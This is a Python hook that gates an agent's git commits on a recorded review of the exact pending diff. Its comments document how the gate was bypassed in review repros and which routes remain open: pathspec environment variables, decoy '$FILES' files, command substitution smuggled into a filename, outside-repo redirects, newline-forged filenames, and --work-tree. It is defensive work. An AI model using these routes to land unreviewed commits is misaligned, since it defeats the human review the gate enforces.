#!/usr/bin/env python3
"""precommit_review_gate — review runs BEFORE the commit, not after it.

WHY THIS REPLACES THE STOP GATE
-------------------------------
`task_completion_gate` asked "was HEAD reviewed?" *after* a commit already
existed. That ordering has two defects the operator called out directly:

  1. The commit has already landed by the time anyone looks. A review that
     finds a blocker is now a second commit, not a correction.
  2. It reviews a SHA, so it can only ever run once the thing it should have
     prevented is history.

This gate moves the boundary. It fires on the `git commit` itself and asks a
question that can still change the outcome: **has the exact content this
commit would land been reviewed?**

WHAT COUNTS AS "THIS CONTENT"
-----------------------------
The digest of ``git diff HEAD -- <the commit's own pathspec>``. Two properties
matter, and both come from scoping to the commit's own paths:

  * It is exactly what `git commit -- <paths>` will write (that form takes the
    working-tree content of those paths), so the review and the commit look at
    the same bytes.
  * It is STABLE while other agents edit other files. A whole-tree digest
    would change every few seconds in this multi-agent tree and deny every
    commit forever; scoping to the pathspec is what makes a real gate viable
    here rather than an obstacle everyone learns to bypass.

Change a byte in a reviewed path after the review, and the digest moves and
the gate re-fires. That is the intended behavior, not a bug: you reviewed
something else.

STORAGE
-------
No new state. It reuses the existing review ledger (`_lib.LAST_REVIEWED`) via
`record_review`'s own outcome-aware reader, keyed on a synthetic
``precommit:<digest>`` in place of a sha. Same file, same grammar, same
clean/blockers outcome tokens.

RECORDING A REVIEW
------------------
    python3 ~/.claude/hooks/record_review.py --pre-commit --clean \\
        --paths <the exact paths you are about to commit>

`--blockers <n>` instead of `--clean` when the review found unresolved
blocker-severity findings; that records the review AND keeps this gate closed
until they are fixed and a fresh review is recorded, because committing over
a known blocker is the precise thing a review boundary exists to stop.

FAIL-OPEN
---------
Every failure path allows: unresolvable repo root, unreadable ledger, a git
error, an empty diff (nothing to review), or any unexpected exception.
Undecodable CONTENT is not an error (GH #5923): a diff or an untracked file
that is not valid UTF-8 is keyed from its raw bytes and gated like any other. A
review-tooling outage must never wedge a session -- the house rule for every
gate in this chain. It blocks only on a confident, positive finding that this
exact content has no review on record.
"""

from __future__ import annotations

import hashlib
import json
import os
import shlex
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import _lib  # noqa: E402  (import after sys.path shim, mirrors sibling modules)
import record_review as rr  # noqa: E402  (shared outcome-aware ledger read)

HOOK_NAME = "precommit_review_gate"

REASON_UNREVIEWED = "unreviewed-commit"
REASON_BLOCKERS = "review-blockers-unresolved"
REASON_UNRESOLVABLE = "unresolvable-pathspec"
# GH #5886 fix-round-4 (R6-B2, cold trust-architect review): a fix-round-3
# attempt STRIPPED GIT_LITERAL_PATHSPECS/GIT_GLOB_PATHSPECS/
# GIT_NOGLOB_PATHSPECS/GIT_ICASE_PATHSPECS from this module's OWN git
# subprocess calls, on the theory that this closed an ambient-env attack.
# Live-reproduced as a REGRESSION against HEAD instead: with one of these set
# in the ambient environment, HEAD (which never touches the git subprocess
# environment) DENIES an attempted commit whose pathspec meaning the env var
# changes, but the stripped version made this module compute a digest under
# git's DEFAULT pathspec semantics while the actual `git commit` (run with
# the ambient var still in its own environment) used the VAR's semantics --
# i.e. the module's digest and the real commit's content could disagree, and
# the gate ALLOWED where HEAD would have DENIED. Fixed by refusing outright,
# never silently normalizing: any commit attempted while one of these four
# vars is present in the environment gets this reason, and it is NOT
# clearable by recording a review (mirrors REASON_UNRESOLVABLE's own
# never-clearable contract) -- the fix is to unset the variable and re-issue
# the commit, never to review around it. See `_PATHSPEC_ENV_VARS`.
REASON_PATHSPEC_ENV_SET = "pathspec-env-set"
# #4933: a pathspec token resolving OUTSIDE the repo (in practice the
# argument of a split redirect suffix — `git commit … -- a.py 2> /tmp/e.log`)
# used to make `pending_key` fail open via git's "outside repository" error,
# landing the commit with no review on record and no deny. Executed repro in
# the 2026-09-07 plan review: of every redirect shape, ONLY the split
# absolute-argument form defeats pending-content resolution; the operator
# tokens themselves (`2>`, fused `2>/tmp/x`, `2>&1`) are digest-inert and stay
# allowed. Recording a review can NEVER clear this reason — re-issue the
# commit ending at the pathspec.
REASON_OUTSIDE_REPO = "pathspec-outside-repo"

# Synthetic ledger key namespace. A real sha is 40 hex chars and can never
# collide with this prefix, so pre-commit and post-commit entries coexist in
# one ledger without either having to know about the other.
PRECOMMIT_PREFIX = "precommit:"

_DIGEST_LEN = 16
_GIT_TIMEOUT_SEC = 20

# GH #5886 fix-round-4 (R6-B2): each of these four env vars changes how git
# interprets a PATHSPEC (not its content) -- GIT_LITERAL_PATHSPECS disables
# all pathspec magic, GIT_GLOB_PATHSPECS/GIT_NOGLOB_PATHSPECS flip whether
# "*"/"?"/"[" are glob or literal by DEFAULT, and GIT_ICASE_PATHSPECS makes
# every pathspec match case-insensitively. This module does NOT strip these
# from its own git calls (a fix-round-3 attempt did, and that was a
# regression -- see REASON_PATHSPEC_ENV_SET's own comment for the live
# repro). Instead, `decide()` REFUSES outright whenever any of these is set
# in the ambient environment, so this module's digest and the real commit's
# content can never silently diverge over pathspec semantics: if a var is
# set, both this module AND the eventual `git commit` subprocess inherit it
# identically, and refusing means neither one is ever trusted to interpret
# the pathspec differently.
#
# NOT closed by this check, and tracked separately on #5892: any var the
# gated command itself sets -- a `VAR=value` prefix typed INLINE on the
# commit command, or an `export`/`env`/`set -a` run earlier in the same or an
# earlier Bash-tool shell (this module never executes that raw command text
# and never inherits from the Bash tool's shells, so it only ever sees an env
# var already present in ITS OWN launch environment), the git
# CLI's own `--literal-pathspecs`/`--glob-pathspecs`/`--noglob-pathspecs`/
# `--icase-pathspecs` options passed directly on the commit command line, and
# `--work-tree`/`--git-dir` redirecting which repository or working tree the
# real commit acts on. None of those reach this module's own environment or
# argument list, so this check cannot see them; they remain open vectors this
# module does not defend against.
_PATHSPEC_ENV_VARS = (
    "GIT_LITERAL_PATHSPECS",
    "GIT_GLOB_PATHSPECS",
    "GIT_NOGLOB_PATHSPECS",
    "GIT_ICASE_PATHSPECS",
)


def pathspec_env_vars_present(environ: dict | None = None) -> list[str]:
    """The subset of `_PATHSPEC_ENV_VARS` actually present in `environ`
    (defaults to the real process environment), in the tuple's own order.
    Presence alone is disqualifying regardless of value (git treats an EMPTY
    GIT_LITERAL_PATHSPECS as unset, but this deliberately does not replicate
    that nuance -- a caller setting the var to anything, including "", is
    already trying to influence pathspec interpretation, and refusing is the
    safe direction). Never raises."""
    env = os.environ if environ is None else environ
    try:
        return [v for v in _PATHSPEC_ENV_VARS if v in env]
    except Exception:
        return []


def _git(cwd: str, *args: str) -> str | None:
    """Run git, returning stdout, or None on ANY failure (fail-open)."""
    try:
        proc = subprocess.run(
            ["git", "-C", cwd, *args],
            capture_output=True,
            text=True,
            timeout=_GIT_TIMEOUT_SEC,
        )
    except Exception:
        return None
    if proc.returncode != 0:
        return None
    return proc.stdout


# Separates non-UTF-8 content's raw-byte digest from its replacement-decoded
# text. Content can contain these marker bytes verbatim (a UTF-8 untracked
# file may carry this exact line), so what rules out a collision is not the
# marker itself but the framing around it: every line of real `git diff`
# output starts with a diff prefix byte (' ', '+', '-', '@', 'd', 'i', ...), and
# every untracked entry's header carries its byte length (`size=`), so a file
# that embeds a forged marker line renders with a different size than the one
# it imitates.
_NON_UTF8_MARKER = "\x00non-utf8-diff-sha256:"


def _git_diff_material(cwd: str, *args: str) -> str | None:
    """`git diff` output as digest material, or None on a real git failure.

    GH #5923: `_git` decodes with text=True, so ONE byte that is not valid
    UTF-8 raised inside subprocess.run, `_git` returned None, and
    `pending_key` read that as "git failed -> degrade open": the commit
    landed with no review on record. Undecodable CONTENT is not an error.

    This reads raw bytes. Valid UTF-8 is decoded and newline-translated
    exactly as text=True did (subprocess's `_translate_newlines`), so every
    ledger key recorded before this change is unchanged. Anything else is
    replacement-decoded and gets the raw diff's own SHA-256 appended, so the
    key still moves when any single byte does (a replacement character alone
    would let two different diffs share one key). A real error (git missing,
    non-zero exit, timeout) still returns None and degrades open, as before.
    """
    try:
        proc = subprocess.run(
            ["git", "-C", cwd, *args],
            capture_output=True,
            timeout=_GIT_TIMEOUT_SEC,
        )
    except Exception:
        return None
    if proc.returncode != 0:
        return None
    raw = proc.stdout

    def _translate(text: str) -> str:
        return text.replace("\r\n", "\n").replace("\r", "\n")

    try:
        return _translate(raw.decode("utf-8"))
    except UnicodeDecodeError:
        text = _translate(raw.decode("utf-8", "replace"))
        return f"{text}\n{_NON_UTF8_MARKER}{hashlib.sha256(raw).hexdigest()}\n"


# Per-file cap when folding an untracked file into the digest. Bounded so a
# huge generated artifact cannot stall the hook; the file's total size is
# mixed in as well, so appending to a capped file still moves the digest.
_UNTRACKED_READ_CAP = 8 * 1024 * 1024
_UNTRACKED_TOTAL_CAP = 64 * 1024 * 1024
_UNTRACKED_MAX_FILES = 2000


def disabled_by_operator(environ: dict | None = None) -> bool:
    """CSA_NO_PRECOMMIT_REVIEW=1 — this gate's own rollback lever.

    Every sibling gate has one (CSA_NO_REQUIRE_PATHSPEC for gate 3,
    CSA_NO_COMMIT_MUTEX for gate 4). Without a per-gate lever the only way out
    of a misfiring review gate is CSA_DISABLE_HOOKS=1, which also switches off
    branch-op blocking, unscoped-commit blocking and the pathspec gate — i.e.
    the operator would have to drop every safety guard to get past this one.
    """
    env = os.environ if environ is None else environ
    return env.get("CSA_NO_PRECOMMIT_REVIEW", "") == "1"


# Shell constructs the hook sees only as literal text. The tokenizer has no
# shell, so `-- $FILES` reaches us unexpanded; git then matches nothing and the
# diff comes back empty. Treating that as "nothing to review" would ALLOW the
# real, expanded content through unreviewed, so these are UNRESOLVABLE.
# NOT included: `*`, `?`, `[` — those are valid git pathspec globs that git
# itself expands, so they resolve to real content and get digested normally.
# (If the SHELL expanded them first, git's match and the shell's may differ;
# the digest then simply won't match the recorded review, which denies — the
# safe direction.)
#
# A token that trips this scan is NOT automatically refused — see
# unresolvable()'s docstring: it is excused when git or the filesystem
# confirms the token denotes something real (a legitimate filename that
# happens to contain one of these characters, e.g. "report (1).html") AND the
# character it tripped on is in _EXCUSABLE_VIA_REAL_CONTENT below — not every
# character here can be excused that way, see that constant's own comment.
_SHELL_META = ("$", "`", "~", "{", "(")

# Which _SHELL_META characters "a real file with this literal name exists" is
# actually evidence of safety for. `(` unquoted mid-word is a bash SYNTAX
# ERROR (confirmed: `echo foo(1).txt` -> "syntax error near unexpected token
# `('"), so any `(` that reaches this hook as a live, parseable command was
# necessarily quoted — a real file resolves the token exactly as git will see
# it. Bare `~` expands ONLY when leading (the start of the word); this scan
# has no leading/non-leading distinction, but "resolves to a real tracked/
# on-disk path" can only be true for the non-leading shape in practice (a
# leading `~` expands to the operator's home directory, essentially never a
# path inside THIS repo), so excusing it here is safe either way.
# `$`, backtick, and `{` are DELIBERATELY EXCLUDED: each can expand an
# unquoted token to a DIFFERENT string the shell substitutes before git ever
# sees it, so "a file literally named '$FILES' happens to exist" says nothing
# about what an unquoted `$FILES` would actually expand to — it is not
# evidence of safety, and treating it as such reopened exactly the LEAK
# closing B3 was supposed to fix (found in round-3 verification: a tracked
# decoy file literally named "$FILES" made `git commit -- $FILES` resolve and
# land unreviewed content, exactly like the unexpanded-variable case this
# gate exists to refuse).
_EXCUSABLE_VIA_REAL_CONTENT = ("(", "~")


def _token_resolves_to_real_content(repo_root: str, cwd: str, token: str) -> bool:
    """True iff git or the filesystem confirms `token` denotes something real.

    Excuses a pathspec token that trips the _SHELL_META scan but is, in fact,
    a legitimate filename containing one of those characters — a real file is
    safe regardless of which characters its name contains; only a token that
    resolves to NOTHING real is genuinely ambiguous shell text. Without this,
    a naive "refuse anything containing a metacharacter" rule made a real
    downloaded file like "report (1).html" an unclearable deny (found in
    round 3 review as the direct side effect of closing the LEAK below).

    Checks tracked content first (`git ls-files --error-unmatch`, which also
    matches a staged-but-uncommitted path), then falls back to `lexists` for a
    genuinely untracked-but-real file on disk (mirrors _untracked_material's
    own reason for existing — a brand-new file is real content too). Never
    raises; any failure resolves to False (the token stays unresolved, which
    is the safe direction — this only ever WIDENS what gets refused, never
    narrows it below the pre-existing behavior).
    """
    try:
        rel = normalize_paths(repo_root, cwd, [token])
        if not rel:
            return False
        rel = rel[0]
    except Exception:
        return False
    if _git(repo_root, "ls-files", "--error-unmatch", "--", rel) is not None:
        return True
    try:
        return os.path.lexists(os.path.join(repo_root, rel))
    except Exception:
        return False


def command_has_unquoted_command_substitution(command: str) -> bool:
    """True iff the RAW `command` text contains an unquoted `$(` or backtick
    inside the span from a bare `--` pathspec marker to the next unquoted
    control operator (`&&`, `||`, `;`, `|`, a non-redirection `&`, newline) —
    i.e. within THIS writing segment's own pathspec region, not the rest of
    the command.

    NOT flagged, and deliberately so: `<(` / `>(` process substitution
    (`_split_segments` fragments on these too, the same mechanism this
    function exists to see past for `$(`/backtick). Verified this is NOT a
    hole rather than assumed: process substitution always expands to
    `/dev/fd/N` or a FIFO path, never to an in-repo path, so a pathspec
    fragment built from it either resolves outside the repository (git
    refuses: "outside repository") or matches nothing (git refuses: "did not
    match any files") — the commit aborts with NOTHING landed, exactly the
    pre-existing "a literal path matching nothing is safe, git refuses it"
    case this module already relies on elsewhere.

    WHY THIS EXISTS (the LEAK the per-token _SHELL_META scan cannot see)
    ----------------------------------------------------------------------
    `_lib._split_segments` treats a bare (unquoted) `$(` or backtick as a
    SEGMENT BOUNDARY and consumes it — deliberately, so gate 1 can find a
    hidden `git checkout` inside a subshell. By the time a pathspec token
    reaches `unresolvable()`, an unquoted command-substitution construct has
    already been stripped OUT of it: `git commit -- report$(cmd).html`
    fragments into a "git commit -- report" segment (this hook's git_segments
    never sees the ".html" tail, let alone the substituted content) whose
    surviving pathspec token, "report", contains no shell metacharacter at
    all and typically matches nothing tracked — which this gate's own "a
    literal path matching nothing is safe, git refuses it" rule then waves
    through as nothing pending. That rule is only true when the shell could
    NOT have altered the token between what this hook sees and what git
    actually receives; an unquoted `$(...)`/backtick means it could have, so
    this checks the token's ORIGIN — the raw command text, the one place that
    still has it — rather than its post-fragmentation remains. Do NOT change
    `_split_segments` to fix this: that tokenizer is gate 1's proven, shared
    contract for finding a hidden state-verb, and is correct for that job.
    NOT flagged: a quoted occurrence, whether single- or double-quoted — that
    survives shlex un-quoting into the final pathspec token intact (shlex
    does not perform command substitution, so it leaves the raw characters in
    place), so it already reaches `unresolvable()`'s per-token scan and is
    judged there, not here.
    SCOPE: not narrowed to a single pathspec TOKEN — the segmenter has
    already destroyed that boundary — but IS bounded to a single pathspec
    REGION: armed at a bare `--` word, disarmed at the next unquoted control
    operator, and re-armable at a LATER bare `--` (a compound command can
    carry more than one writing `git commit -- ...` clause). Unbounded
    (armed-forever-after-the-first-`--`) was ITSELF a bug, found in round-3
    verification: `git commit -m x -- reviewed.py && echo $(date)` — a
    perfectly ordinary chained command with nothing dangerous in its
    pathspec — denied forever, because recording a review can never clear an
    UNRESOLVABLE verdict; that is the exact failure class this whole function
    exists to prevent, just self-inflicted instead of from an attacker. A
    compound command whose SAME clause's own commit MESSAGE contains an
    unrelated, unquoted `$(...)` positioned after that clause's own `--` is a
    narrower, still-accepted false positive: erring toward refusing more than
    strictly necessary WITHIN one clause's own region is the safe direction
    for a review boundary, matching gate 1's own deny-on-parse-ambiguity
    stance. A command with NO bare `--` at all returns False unconditionally
    — nothing pathspec-shaped exists for the shell to have altered.
    """
    q: str | None = None
    armed = False
    i = 0
    n = len(command)
    while i < n:
        c = command[i]
        two = command[i : i + 2]
        if q:
            if c == q:
                q = None
            i += 1
            continue
        if c in ("'", '"'):
            q = c
            i += 1
            continue
        if c in (";", "|", "\n"):
            # Covers `&&`/`||` too, one character at a time -- each `&`/`|`
            # is individually disarming (see the `&` branch below for the
            # ONE exception, redirection), so a two-char `&&`/`||`
            # special-case would be redundant with this branch and the `&`
            # branch combined; deliberately not duplicated.
            armed = False
            i += 1
            continue
        if c == "&":
            # A bare `&` alone IS a control operator (backgrounding) UNLESS
            # it is part of a REDIRECTION: `2>&1`/`>&2` (preceded by `>`/`<`)
            # or `&>file`/`&>>file` (followed by `>`). A redirection does not
            # end the pathspec region at all -- disarming there reopened the
            # very leak this scan exists to close, for the redirection shape
            # only (found in round-4 verification: `-- a.py 2>&1 $(cmd)`
            # disarmed on the `&`, so `$(cmd)`'s expansion landed unreviewed).
            prev = command[i - 1] if i > 0 else ""
            nxt = command[i + 1] if i + 1 < n else ""
            if prev not in (">", "<") and nxt != ">":
                armed = False
            i += 1
            continue
        if not armed:
            if (
                c == "-"
                and two == "--"
                and (i == 0 or command[i - 1].isspace())
                and (i + 2 >= n or command[i + 2].isspace())
            ):
                armed = True
                i += 2
                continue
            i += 1
            continue
        if two == "$(" or c == "`":
            return True
        i += 1
    return False


def normalize_paths(repo_root: str, cwd: str, paths: list[str]) -> list[str]:
    """Pathspec tokens -> repo-root-relative, so the digest is cwd-independent.

    THE bug this fixes: the gate ran git from the command's cwd while
    `record_review --pre-commit` ran it from the repo toplevel. Pathspecs are
    cwd-relative, so for any commit issued from a subdirectory (or via
    `git -C <repo>` from elsewhere) the two sides digested different things —
    the gate denied, and the remedy it printed recorded nothing. Unclearable.
    Both sides now call this.
    """
    # realpath BOTH sides, not abspath: on macOS a temp dir is handed out as
    # /var/... while `rev-parse --show-toplevel` reports /private/var/...
    # (/var is a symlink). relpath across that mismatch produced a garbage
    # ../../.. path, git matched nothing, the digest came back empty and the
    # gate silently ALLOWED every commit — a fail-open in the wrong direction,
    # invisible to unit tests that happened to use one spelling on both sides.
    try:
        root = os.path.realpath(repo_root)
    except Exception:
        root = repo_root
    out: list[str] = []
    for token in paths:
        if not token:
            continue
        try:
            base = token if os.path.isabs(token) else os.path.join(cwd, token)
            # realpath the DIRECTORY only: resolving the leaf would follow a
            # symlinked file to its target, so `-- link.py` would digest the
            # target instead of the link entry (repoint the link, target
            # unchanged -> empty diff -> allow).
            head, tail = os.path.split(base)
            rel = os.path.relpath(os.path.join(os.path.realpath(head), tail), root)
        except Exception:
            rel = token
        out.append(rel)
    return sorted(set(out))


def tokens_outside_repo(repo_root: str, cwd: str, tokens: list[str]) -> list[str]:
    """Normalized pathspec tokens that escape `repo_root` — the #4933 deny test.

    Reuses `normalize_paths` verbatim (same realpath discipline, same symlink
    caveats) so this test and the digest can never disagree about where a
    token points. A token whose repo-root-relative form begins with `..`
    resolves outside the repository: git would refuse it as a pathspec
    ("fatal: … is outside repository"), which `pending_key` reads as a git
    failure and fails OPEN — the exact #4933 hole. Geometric and confident:
    no redirect-shape guessing, catches any outside-repo token however it got
    into the pathspec. Empty list on any internal error (caller then proceeds
    exactly as before this check existed).
    """
    try:
        out = []
        for rel in normalize_paths(repo_root, cwd, tokens):
            if rel == ".." or rel.startswith(".." + os.sep):
                out.append(rel)
        return out
    except Exception:
        return []


def unresolvable(repo_root: str, cwd: str, tokens: list[str]) -> bool:
    """True when a pathspec token is SHELL text this hook cannot evaluate.

    Deliberately narrow — only the genuinely ambiguous case. Mirrors gate 1's
    deny-on-parse-ambiguity stance: with `-- $FILES` the hook literally cannot
    know what will be committed, and reading the resulting empty diff as
    "nothing pending" would let the expanded content through unreviewed.

    NOT treated as unresolvable: a literal path that simply matches nothing.
    That commit lands nothing because **git itself refuses it**, so denying it
    here would add false positives (it broke ten existing dispatcher tests
    that use fabricated fixture paths) while closing no real hole.

    A token that trips the _SHELL_META scan is excused ONLY when every
    triggering character is in `_EXCUSABLE_VIA_REAL_CONTENT` (see that
    constant's own comment for why `$`/backtick/`{` can never be excused this
    way) AND `_token_resolves_to_real_content` confirms the token denotes
    something real. `repo_root`/`cwd` exist only to make that resolution
    check possible; every other branch here is unchanged.
    """
    for t in tokens:
        hits = [m for m in _SHELL_META if m in t]
        if not hits:
            continue
        if all(m in _EXCUSABLE_VIA_REAL_CONTENT for m in hits) and _token_resolves_to_real_content(
            repo_root, cwd, t
        ):
            continue
        return True
    return False


def _control_char_free(name: str) -> bool:
    """True iff `name` contains no ASCII control character (below 0x20) and
    no DEL (0x7f). Never raises."""
    try:
        return all(ord(c) >= 0x20 and ord(c) != 0x7F for c in name)
    except Exception:
        return False


def _digest_safe_name(rel: str) -> str:
    """`rel` as it appears in the `--- untracked <name> ...` header line.

    GH #5886 fix-round-4 BLOCKER R6-B1 (cold trust-architect review): the
    header this function used to be inlined as (`f"\\n--- untracked {rel}
    size={size}\\n"`) renders `rel` VERBATIM, so a filename containing its
    own literal newline plus a fabricated `--- untracked <other-name>`
    fragment digests IDENTICALLY to two separate, genuinely different files
    named the fabricated pieces -- a directory literally named
    ``a.py size=46\\n<payload>\\n--- untracked pkg`` (one weird untracked
    entry, reviewed clean) reconstructs byte-for-byte identically to two
    ordinary staged files `pkg/a.py` (containing `<payload>`) and `pkg/b.py`,
    live-landed end to end through `--rekey` and gate 3b in the cold review's
    own repro. Fixed by rendering any name containing a control character
    (below 0x20, or DEL/0x7f -- see `_control_char_free`) as a `\\0`-prefixed
    JSON string instead of the raw name: `\\0` is a byte no real git pathname
    can ever contain (git itself uses it as ITS OWN path separator in `-z`
    output), so this can never collide with any ORDINARY name's rendering,
    and `json.dumps` unambiguously escapes every embedded control character,
    quote, and backslash so the fabricated-boundary trick cannot reproduce
    itself inside the JSON string either. Every EXISTING name with no control
    character renders byte-identically to before (this only changes the
    control-character case), so every prior digest for an ordinary name is
    unchanged. Never raises; any failure resolves to the JSON-escaped form
    (the conservative direction -- worst case is an ordinary name rendered
    more verbosely than before, never the reverse).
    """
    try:
        # GH #5923 L7: a name os.fsdecode'd from non-UTF-8 bytes carries lone
        # surrogates, which digest_of's "replace" encode collapses to "?", so
        # bad\xe9.py, bad\xe8.py and a literal bad?.py would share one header.
        # json.dumps escapes each surrogate distinctly (\udce9).
        if _control_char_free(rel) and not any("\ud800" <= c <= "\udfff" for c in rel):
            return rel
        return "\0" + json.dumps(rel)
    except Exception:
        try:
            return "\0" + json.dumps(rel, default=str)
        except Exception:
            return "\0<unrepresentable-name>"


def _format_untracked_entries(
    cwd: str, names: list[str], *, lossy_sink: list[str] | None = None
) -> str:
    """The `\\n--- untracked ...` digest-material grammar for a given set of
    repo-root-relative `names`, whatever their REAL git tracked-status is.

    Factored out of `_untracked_material` (2026-09-01, AA-0064 / gate-
    optimization plan waste-elimination P3) so `--rekey`'s safety predicate
    (`reconstruct_pending_diff_assuming_untracked`, below) can reuse the
    IDENTICAL formatting for a path that is no longer really untracked (it
    has since been staged) without forking this grammar — the whole point of
    `--rekey`'s reconstruction is to prove BYTE-IDENTITY against the ORIGINAL
    review's digest, which is only possible if the format is exactly this
    one, not a re-derived approximation of it. `_untracked_material` itself
    is now a thin wrapper: `ls-files --others` to find the real names, then
    this. Pure formatting; never raises (matches `_untracked_material`'s own
    contract). THE DIGEST GRAMMAR ITSELF IS UNCHANGED for any ordinary name
    (no control character) by either `lossy_sink` or `_digest_safe_name`
    below — every existing ledger key for an ordinary name still matches
    exactly the same bytes it always did; these only add (a) an out-of-band
    observation channel a caller can opt into, and (b) an unambiguous
    rendering for the control-character case that never existed safely
    before (see `_digest_safe_name`'s own docstring, GH #5886 R6-B1).

    GH #5886 fix-round-3/4 BLOCKER B1/R6-B1: `--rekey`'s safety claim is "the
    reconstruction is byte-identical to what was originally reviewed," but
    this formatter can be LOSSY or AMBIGUOUS in ways that never show up in
    the digest itself: (1) invalid UTF-8 is decoded with `errors="replace"`,
    so two genuinely different byte sequences that both contain invalid
    UTF-8 can decode to the identical string; (2) only the first
    `_UNTRACKED_READ_CAP` (8 MiB) bytes of any one file are ever read, so a
    file over that size can change anywhere past the cap with zero effect on
    the digest; (3) once `_UNTRACKED_TOTAL_CAP` (64 MiB) or
    `_UNTRACKED_MAX_FILES` (2000 parts entries, about 1000 readable files,
    since each readable file renders two entries) is reached, every remaining file collapses
    into a single `<capped after N entries>` marker that carries no content
    at all; (4) an UNREADABLE file's stat-only rendering carries no real
    content either -- a file reviewed unreadable, then later readable with
    genuinely different content the caller never saw, must not be trusted
    just because the two "look" different in the digest (a real content
    difference DOES move the digest here, but the REVERSE risk -- two
    different real files that both happen to render unreadable identically,
    e.g. both deleted-then-recreated with the same size/mtime by an attacker
    who controls timing -- is exactly the kind of coincidence this module
    should never bet safety on). `--rekey`'s reconstruction can hit any of
    these for a large directory/glob pathspec, silently reconstructing a
    digest that matches the ORIGINAL review even though real, unreviewed
    content changed in a spot the digest never covered. `lossy_sink`, when
    passed a list, has a reason string APPENDED to it every time any of these
    four conditions is hit for this call (not merely once — a caller counting
    entries sees the true number of lossy hits). `rekey_digest_if_only_
    untracked_became_staged` uses this to REFUSE outright rather than trust a
    digest match that could have been produced two different ways.
    """
    parts: list[str] = []
    total = 0
    ordered_names = sorted(set(n for n in names if n))
    for rel in ordered_names:
        # Aggregate cap: a directory pathspec over a large untracked tree
        # could otherwise build a multi-hundred-MB string inside a blocking
        # PreToolUse hook. An OOM there fails open -- i.e. silently no gate.
        if total >= _UNTRACKED_TOTAL_CAP or len(parts) >= _UNTRACKED_MAX_FILES:
            parts.append(f"\n--- untracked <capped after {len(ordered_names)} entries>\n")
            if lossy_sink is not None:
                lossy_sink.append("total-cap-or-file-count-cap")
            break
        safe_rel = _digest_safe_name(rel)
        full = os.path.join(cwd, rel)
        try:
            size = os.path.getsize(full)
            budget = min(_UNTRACKED_READ_CAP, _UNTRACKED_TOTAL_CAP - total)
            with open(full, "rb") as fh:
                blob = fh.read(budget)
            total += len(blob)
            # size= is mixed in so appending past the cap still moves the digest.
            parts.append(f"\n--- untracked {safe_rel} size={size}\n")
            if size > len(blob) and lossy_sink is not None:
                # The read was truncated by this call's budget (the per-file
                # cap, or what remained of the aggregate cap) -- bytes past
                # `blob` were never read at all, let alone digested.
                lossy_sink.append(f"read-truncated:{rel}")
            try:
                parts.append(blob.decode("utf-8"))
            except UnicodeDecodeError:
                if lossy_sink is not None:
                    lossy_sink.append(f"invalid-utf8:{rel}")
                parts.append(blob.decode("utf-8", "replace"))
                # GH #5923 B1: the replacement decode alone lets two files
                # differing only in an invalid byte share one digest (review
                # once, swap the byte, commit). The raw bytes' own hash keeps
                # every byte in play; UTF-8 content never reaches this branch,
                # so no existing key moves.
                parts.append(f"\n{_NON_UTF8_MARKER}{hashlib.sha256(blob).hexdigest()}\n")
        except Exception:
            # Unreadable is still a distinct state -- but mix in size/mtime so
            # two different unreadable versions cannot digest identically.
            if lossy_sink is not None:
                lossy_sink.append(f"unreadable:{rel}")
            try:
                stamp = os.stat(full)
                parts.append(
                    f"\n--- untracked {safe_rel} <unreadable size={stamp.st_size} mtime={stamp.st_mtime_ns}>\n"
                )
            except Exception:
                parts.append(f"\n--- untracked {safe_rel} <unreadable>\n")
    return "".join(parts)


def _ls_untracked_names(cwd: str, ordered: list[str]) -> list[str] | None:
    """Repo-relative names of the untracked files under `ordered`, read as
    BYTES, or None on any git failure. Shared by `_untracked_material` and
    `reconstruct_pending_diff_assuming_untracked` so the two can never fork.

    GH #5923 L3/L6: the old text-mode read mangled names before they reached
    the digest. A CR in a name was translated to LF, so open() failed and the
    file rendered `<unreadable>` whatever its content (review once, edit
    freely); a non-UTF-8 name raised, `_git` returned None, and every
    untracked file under the pathspec dropped out. os.fsdecode keeps each name
    exactly round-trippable for open(). An ordinary UTF-8 name with no CR
    decodes exactly as before, so its key is unchanged; names text mode used
    to mangle now key from their real bytes, which is the fix.
    """
    try:
        proc = subprocess.run(
            ["git", "-C", cwd, "-c", "core.quotePath=false", "ls-files", "--others",
             "--exclude-standard", "-z", "--", *ordered],
            capture_output=True,
            timeout=_GIT_TIMEOUT_SEC,
        )
    except Exception:
        return None
    if proc.returncode != 0:
        return None
    return [os.fsdecode(n) for n in proc.stdout.split(b"\0") if n]


def _untracked_material(cwd: str, ordered: list[str]) -> str:
    """Digest material for paths git does not track yet.

    An untracked file produces NO output from `git diff HEAD`, so without this
    a brand-new file would look like "no pending change" and sail through the
    gate unreviewed — the single most review-worthy kind of change there is.
    (It only reaches the gate once `git add`-ed in practice, but relying on
    that is relying on an accident of ordering, not on a guarantee.)
    """
    # -z: without it git C-quotes a non-ASCII name ("caf\303\251.py"), open()
    # then fails, and EVERY version of that file digests to the same literal
    # "<unreadable>" -- review once, rewrite freely, gate still says reviewed.
    names = _ls_untracked_names(cwd, ordered)
    if not names:
        return ""
    return _format_untracked_entries(cwd, names)


def pending_diff(repo_root: str, cwd: str, paths: list[str]) -> str | None:
    """The content this commit would land, or None when it cannot be determined.

    Always run from `repo_root` against repo-root-relative paths, so the
    digest does not depend on which directory the command was issued from.
    """
    if not paths:
        return None
    ordered = normalize_paths(repo_root, cwd, paths)
    diff = _git_diff_material(repo_root, "diff", "HEAD", "--", *ordered)
    if diff is None:
        return None
    return diff + _untracked_material(repo_root, ordered)


def digest_of(diff_text: str) -> str:
    return hashlib.sha256(diff_text.encode("utf-8", "replace")).hexdigest()[:_DIGEST_LEN]


# pending_key's third state: the pathspec could not be resolved to any content.
UNRESOLVABLE = "__unresolvable__"


def pending_key(repo_root: str, cwd: str, paths: list[str]) -> str | None:
    """The ledger key for the content this commit would land.

    Three outcomes, deliberately distinct:
      * a key            -> there is content; it needs a review on record.
      * None             -> genuinely nothing pending (message-only amend,
                            no-op re-commit), OR a literal pathspec that
                            matches nothing. No review is owed either way --
                            see below for why the second case is safe.
      * UNRESOLVABLE     -> a pathspec token the SHELL could have altered
                            between what this hook saw and what git will
                            receive (unexpanded $VAR, unquoted
                            $(...)/backtick, brace expansion {a,b}, leading
                            ~, or an unquoted `(` denoting nothing real), or
                            a post-fragmentation remnant of one (see
                            `unresolvable()`'s own docstring). The
                            AUTHORITATIVE pair is `_SHELL_META` /
                            `_EXCUSABLE_VIA_REAL_CONTENT` -- read those, not
                            this list, when the question is whether some
                            construct triggers it; the list above is a
                            reader's summary and can go stale when they
                            change. Must NOT be waved through as "nothing
                            pending".

